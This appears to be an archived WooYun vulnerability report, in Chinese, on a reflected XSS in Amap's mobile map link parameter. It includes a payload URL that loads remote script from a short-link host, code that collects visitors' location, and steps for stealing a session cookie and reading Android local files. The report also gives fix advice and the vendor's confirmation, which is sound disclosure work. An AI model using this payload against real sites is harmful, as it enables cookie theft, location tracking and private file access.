{"id": 10971, "wybug_id": "wooyun-2013-026331", "wybug_title": "用高德地图反射xss取访客位置和android-webkit xss", "wybug_corp": "高德软件", "wybug_author": "horseluke", "wybug_date": "2013-06-19 17:41", "wybug_open_date": "2013-08-03 17:42", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-03：\t细节向公众公开  简要描述： 因业务原因对GIS在线地图商进行了一些业务接触和开发，完成后就顺带进行了复查，然后发现一个各地图商常犯的反射xss错误。这里以高德为例，展示如何结合GIS业务特点借助xss做些有意思的事情，顺带实践SuperHei去年那篇基于android-webkit的xss。 详细说明：  （1）许多GIS在线地图商有提供基于url的跳转接口，用于直接跳到地图页面进行poi展示，比如高德的手机浏览器URI之地图标注：http://mo.amap.com/?q=31.234527,121.287689&name=park&dev=0（http://api.amap.com/URI/browser_guide）不过许多时候GIS在线地图商会对某些用户自定义参数没有控制好，很容易导致xss发生，比如高德的反射xss参数在name。不过既然是在GIS，要xss总得要充分利用其业务价值，比如说：获取访客地理信息。（2）SuperHei有一篇基于android-webkit的xss：http://www.80vul.com/webzine_0x06/PSTZine_0x06_0x05.txt根据文档中的内容和个人实践来看，只要Android 4.0以下，就一定有“[0day-NO.1]、android-webkit跨协议漏洞”，那么就等于只要网站有任意一个反射xss，那么就可以诱导访问手机受害者的一些特殊文件（视乎文件权限而定）。   漏洞证明：  此处结合新浪微博客户端的android-webview来演示。（1）构造url：\nhttp://mo.amap.com/?q=22,110&name=%3Cimg%20src=%22%22%20onerror=%22this.error=null;window.jQuery.getScript('http://t.cn/zH3lOn0');%22%20%3E#thirdpoi\n这个url使用了地图中jquery提供的载入js方法直接载入，以此绕过xss筛选器。http://t.cn/zH3lOn0 的重点代码：（A）xss_tester.amap.getLocation方法中，通过AF.GeolocationService.getPosition方法当前访问者位置、以及通过AF.Geocoder.regeocode方法获取附近地标：\nxss_tester.amap.getLocation = function(){\t\t\t\tAF.GeolocationService.getPosition(\t\t\tfunction(result_location){\t\t\t\t\t\t\t\tvar user_cuurent_location = {};\t\t\t\t//略\t\t\t\t\t\t\t\tvar geocoder_one = new AF.Geocoder({range:1000,crossnum:0,roadnum:0,poinum:3});\t\t\t\tgeocoder_one.regeocode(\t\t\t\t\tresult_location, \t\t\t\t\tfunction(regeocode_result){\t\t\t\t\t\t//略\t\t\t\t\t\talert(\t\t\t\t\t\t\t'当前经纬度：' + user_cuurent_location.lng\t\t\t\t\t\t\t + user_cuurent_location.lat + \"\\r\\n\"\t\t\t\t\t\t\t + '精度：' + user_cuurent_location.accuracy + \"\\r\\n\"\t\t\t\t\t\t\t + '最近的位置：' + user_cuurent_location.province_name + user_cuurent_location.city_name + user_cuurent_location.district_name + user_cuurent_location.poi_name\t\t\t\t\t\t\t + \"(方位：\" + user_cuurent_location.poi_direction + \"方向约\" + user_cuurent_location.poi_distance + '米)'\t\t\t\t\t\t);\t\t\t\t\t\t\t\t\t\t\t},\t\t\t\t\tfunction(regeocode_error){\t\t\t\t\t\t//略\t\t\t\t\t}\t\t\t\t);\t\t\t},\t\t\t\t\t\tfunction(error){\t\t\t\t//略\t\t\t}\t\t);\n（B）xss_tester.amap.readLocalFile方法是照搬SuperHei的代码而写，在此感谢。（2）将上面的url生成短链（这是因为直接发微博是发不到的；而tinyurl.com也会被微博拦截无法访问）：http://is.gd/dvgkzZ（3）发微博\n\n（4）诱导受害者访问获得cookies：高德挂万漏一了，重要的sso登录信息passport_login键值刚好没有httponly保护。（此处以chrome访问为例）\n\n利用高德接口，获得受害者的方位等信息：\n\n（android < 4 有效）获得/system/build.prop内容（可读原因：other用户可读）\n\n（android < 4 有效）获得/data/data/com.sina.weibo/shared_prefs/com.sina.weibo_preferences.xml内容，被遮盖处即为新浪微博的uid（可读原因：该webview是由微博启动）\n\n   修复方案：  以下建议针对高德地图，其他地图商请根据情况自行检查。（1）修复手机浏览器URI之地图标注的参数name，做好html代码转义（2）复查其他各类api（尤其是可以让用户输入参数的api）是否存在类似问题（3）对cookies中的passport_login键值作httponly保护   版权声明：转载请注明来源 horseluke@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-06-19 19:19 厂商回复： 思路不错，感谢反馈 最新状态： 2013-06-24：已修复XSS  ", "replys": "漏洞评价：\n评论\n     2013-06-19 21:09 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  总觉得反射性的不好利用..欺骗点击吗??    \n     2013-06-20 10:30 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @基佬库克 是的，得结合业务特点欺骗之...    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}